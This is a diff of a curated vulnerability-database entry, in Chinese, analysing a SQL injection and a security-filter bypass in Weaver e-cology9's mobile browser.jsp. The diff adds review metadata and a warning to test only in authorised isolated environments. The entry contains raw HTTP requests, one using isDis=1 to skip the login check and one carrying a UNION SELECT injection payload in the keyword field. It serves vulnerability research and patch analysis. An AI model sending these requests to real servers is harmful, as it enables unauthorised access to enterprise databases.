@@ -1,10 +1,50 @@
 ---
 source: "MrWQ/vulnerability-paper"
+title: "泛微e-cology9 browser.jsp SQL注入与安全过滤路径绕过分析"
+product: "泛微e-cology9"
+record_type: "analysis"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "通告<=10.55；正文发现同名10.55补丁被覆盖，须按补丁内容/哈希确定"
+prerequisites: "isDis=1后未检查user null；SecurityRuleMobile29前置路径限制需绕过"
+side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
+review_date: "2026-10-02"
+source_url: "https://mp.weixin.qq.com/s/17tc4ep83x4243lzr-brCg"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AE%20e-cology9%20browser.jsp%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.md"
+id: "vw-b3f6fa379d1f48e192d89d43"
+entity_id: "ve-b3f6fa379d1f48e192d89d43"
+schema_version: "1"
 ---
 
-# 泛微 e-cology9 browser.jsp SQL 注入漏洞分析
+# 泛微e-cology9 browser.jsp SQL注入与安全过滤路径绕过分析
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：泛微e-cology9；browser.jsp SQL注入与安全过滤路径绕过分析
+- 版本、配置及部署条件：通告<=10.55；正文发现同名10.55补丁被覆盖，须按补丁内容/哈希确定
+- 认证与权限前提：isDis=1后未检查user null；SecurityRuleMobile29前置路径限制需绕过
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 相比CNVD/QVD简报提供补丁差分、isDis鉴权缺失、三层URL解码与listRemindType browserTypeId269根因，宜作主分析
+- 重要版本细节：10.55/10.56所列补丁类MD5相同，不能单凭包名断受影响；作者时间线归因是推测应标注
+- 正文将||与&&条件概括为所有路径必须.jsp，与所列Java优先级不完全一致
+- 关键补丁/请求与成功结果部分仍仅图片；保留独立分析而非与POC短篇简单删重
+
+## 操作风险
+
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/17tc4ep83x4243lzr-brCg)
 
 ![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWNVTCicOUWOl5uiblE2D4qBRvH06icOMAjUNoAiaevoJbn2uwwuponRyrqXYclYFYJFia2en7GNlR7l6Q/640?wx_fmt=png)
@@ -156,7 +196,7 @@ if (!isDis) {
 
 回到上面，现在可以确定的是该参数是必须需要存在的，且参数值还得必须为 1。不妨构造一个请求发送看看。
 
-```
+```http
 POST /mobile/plugin/browser.jsp HTTP/1.1
 Host: 
 Accept-Encoding: gzip, deflate
@@ -164,11 +204,12 @@ Accept: */*
 Accept-Language: en-US;q=0.9,en;q=0.8
 Connection: close
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 7
 
 isDis=1
 
 ```
+
+> 请求长度说明：原资料 Content-Length 为 7；静态长度已移除，应由客户端根据最终请求体的字节数生成。
 
 ![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWNVTCicOUWOl5uiblE2D4qBRF9ibtyywNSy9RyHuW6oibRGWicMqIdd14I8LsibLyvicH5wVPX9YqVMjmBA/640?wx_fmt=png)
 
@@ -234,7 +275,7 @@ if(user == null)  return ;
 
 先简单尝试注入一下，请求如下：
 
-```
+```http
 POST /mobile/plugin/browser.jsp HTTP/1.1
 Host: 
 Accept-Encoding: gzip, deflate
@@ -243,11 +284,12 @@ Accept-Language: en
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
 Connection: close
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 54
 
 isDis=1&browserTypeId=160&keyword=a%' union select 1,'
 
 ```
+
+> 请求长度说明：原资料 Content-Length 为 54；静态长度已移除，应由客户端根据最终请求体的字节数生成。
 
 ![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWNVTCicOUWOl5uiblE2D4qBR6tyGC6iaZ8w0hiakGpOlhnFjn1NA6c48rZCiaBHNlDENn9hc7zupRGmwQ/640?wx_fmt=png)
 
